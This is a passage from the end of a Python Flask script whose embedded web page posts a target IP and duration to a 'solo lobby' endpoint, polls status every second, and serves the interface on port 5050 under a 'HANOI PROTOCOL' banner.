            await fetch('/api/solo_lobby', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip: targetIp, duration_ms: durationMs})
            });
            fetchStatus();
        }

        updateSortIcons();
        setInterval(fetchStatus, 1000); // 1 second fast poll for UI snappy-ness
        fetchStatus();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    print("==================================================")
    print(" HANOI PROTOCOL // NETWORK OPERATIONS")
    print(" Listening on 0.0.0.0:5050")
    print("==================================================")
    app.run(host='0.0.0.0', port=5050, debug=False)